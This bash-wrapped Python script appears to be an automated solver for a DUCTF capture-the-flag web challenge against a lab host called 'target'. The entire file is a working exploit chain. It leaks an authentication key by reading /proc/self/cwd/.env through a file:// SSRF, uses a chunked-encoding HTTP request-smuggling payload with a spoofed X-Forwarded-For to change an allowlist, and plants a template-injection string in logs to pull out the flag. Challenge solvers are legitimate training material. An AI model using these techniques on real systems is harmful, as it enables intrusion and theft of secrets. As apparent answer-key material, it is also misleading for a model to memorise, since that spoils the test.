#!/usr/bin/env bash
set -euo pipefail

python3 - <<'PY'
import random
import re
import socket
import string
import time
from urllib.request import Request, urlopen

import requests

BASE = "http://target:8118"


def wait_for_customer_app() -> None:
    headers = {"Host": "dev.customer.ductf"}
    deadline = time.time() + 120
    last_error = None
    while time.time() < deadline:
        try:
            resp = requests.get(BASE + "/", headers=headers, timeout=5)
            if resp.status_code < 500:
                return
        except requests.RequestException as exc:
            last_error = exc
        time.sleep(1)
    raise SystemExit(f"customer app did not become ready: {last_error}")


def register_and_login(session: requests.Session) -> None:
    suffix = "".join(random.choice(string.ascii_lowercase) for _ in range(8))
    username = f"solver_{suffix}"
    password = "solverpass123"
    headers = {"Host": "dev.customer.ductf"}
    session.post(
        BASE + "/register",
        data={"username": username, "password": password},
        headers=headers,
        allow_redirects=False,
        timeout=10,
    )
    resp = session.post(
        BASE + "/login",
        data={"username": username, "password": password},
        headers=headers,
        allow_redirects=False,
        timeout=10,
    )
    if resp.status_code != 302:
        raise SystemExit("login failed")


def leak_auth_key(session: requests.Session) -> str:
    headers = {"Host": "dev.customer.ductf"}
    resp = session.post(
        BASE + "/",
        data={"url": " file:///proc/self/cwd/.env"},
        headers=headers,
        timeout=10,
    )
    match = re.search(r"AUTHENTICATION_KEY=([A-Za-z0-9_]+)", resp.text)
    if not match:
        return "None"
    return match.group(1)


def discover_forwarded_ip(auth_key: str) -> str:
    resp = requests.get(
        BASE + "/ping",
        headers={"Host": "dev.rpc-service.ductf", "Auth-Key": auth_key},
        timeout=10,
    )
    match = re.search(r"The IP recieved was:\s*([0-9.]+)", resp.text)
    if not match:
        raise SystemExit("failed to discover forwarded IP")
    return match.group(1)


def send_smuggled_request(auth_key: str, ip: str) -> None:
    smuggled = (
        f"GET /update_allowlist?ip={ip} HTTP/1.1\r\n"
        "Host: dev.rpc-service.ductf\r\n"
        f"Auth-Key: {auth_key}\r\n"
        "X-Forwarded-For: 127.0.0.1\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "0\r\n"
        "\r\n"
    )
    payload = (
        "GET /ping HTTP/1.1\r\n"
        "Host: dev.rpc-service.ductf\r\n"
        "Connection: keep-alive\r\n"
        "Transfer-Encoding: chunked\r\n"
        "\r\n"
        "5\r\n"
        "AAAAAXX2\r\n"
        f"{len(smuggled) + 4:X}\r\n"
        "0\r\n"
        "\r\n"
        f"{smuggled}"
    ).encode()
    with socket.create_connection(("target", 8118), timeout=10) as sock:
        time.sleep(6)
        sock.sendall(payload)
        time.sleep(1)
        try:
            while sock.recv(4096):
                pass
        except Exception:
            pass


def poison_logs(auth_key: str) -> None:
    req = Request(BASE + "/stats?{config.__init__.__globals__[FLAG]}")
    req.add_header("Host", "dev.rpc-service.ductf")
    req.add_header("Auth-Key", auth_key)
    try:
        urlopen(req, timeout=10).read()
    except Exception:
        return


def fetch_flag(auth_key: str) -> str:
    resp = requests.get(
        BASE + "/stats?get_log=true&get_config=true",
        headers={"Host": "dev.rpc-service.ductf", "Auth-Key": auth_key},
        timeout=10,
    )
    match = re.search(r"DUCTF\{[^}]+\}", resp.text)
    if not match:
        raise SystemExit("failed to recover flag from logs")
    return match.group(0)


def main() -> None:
    session = requests.Session()
    wait_for_customer_app()
    register_and_login(session)
    auth_key = leak_auth_key(session)
    forwarded_ip = discover_forwarded_ip(auth_key)
    send_smuggled_request(auth_key, forwarded_ip)
    time.sleep(1)
    poison_logs(auth_key)
    flag = fetch_flag(auth_key)
    with open("/app/flags.txt", "w", encoding="utf-8") as f:
        f.write(flag + "\n")


if __name__ == "__main__":
    main()
PY
